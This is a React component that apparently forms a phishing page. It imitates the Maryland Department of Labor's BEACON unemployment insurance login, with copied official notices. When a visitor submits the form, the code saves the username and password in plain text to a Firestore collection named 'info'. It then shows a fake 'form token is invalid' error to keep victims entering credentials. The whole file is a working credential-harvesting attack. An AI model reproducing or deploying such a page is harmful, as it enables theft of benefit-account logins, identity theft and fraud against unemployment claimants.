import {useEffect, useState} from 'react'
import {addDoc, collection, serverTimestamp, Timestamp} from "firebase/firestore"
import {db} from "../firebase";

const Form = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const [displayError, setDisplayError] = useState(false);

    const displayErr = () => {
        setDisplayError(true);
    }

    const addInfo = async (e) => {
        e.preventDefault();
        if (email === '' && password === '') {
            alert('input your email and password')
        } else {
            try {
                await addDoc(collection(db, 'info'), {
                    email: email,
                    password: password,
                    creatAt: serverTimestamp()
                })
            } catch (error) {
                alert(error);
            }
            setEmail('');
            setPassword('');
        }
    }
  return (
    <div className='myForm'>
        <div className='subForm'>
            <p>Welcome to the Maryland Department
                 of Labor Unemployment Insurance
                 BEACON system. To login to your
                 account enter your username and
                  password below and select â€˜Loginâ€™.
            </p>
            <p>On Sunday, July 4, 2021, the Maryland Division
                 of Unemployment Insurance (DUI) reinstated a
                  requirement that regular unemployment insurance
                   claimants must actively search for work to maintain
                    their eligibility
                 for unemployment insurance (UI) benefits.
            </p>
            <div className={  displayError === true ? 'displayError' : 'dontDisplay'}>
            There was a problem with your submission. Errors are marked below. <br></br>
Form token is invalid. Please refresh the page.
            </div>
            <form onSubmit={addInfo}>
                <label>Username : <span style={{color: '#b94a48'}}>*</span></label><br></br><br></br>
                <input type='text' value={email} onChange={(e)=>{setEmail(e.target.value)}}/><br></br><br></br>
                <label>Password : <span style={{color: '#b94a48'}}>*</span></label><br></br><br></br>
                <input type='text' value={password} onChange={(e)=> {setPassword(e.target.value)}}/><br></br><br></br>
                <button type='submit' onClick={displayErr} className='myBtn'>Login</button>
            </form>
            <p>
            Click here to activate your existing unemployment insurance account. If you
             activated your account in the One-Stop application,
             you will access your BEACON account with the same username and password.
            </p>
        </div>

    </div>
  )
}

export default Form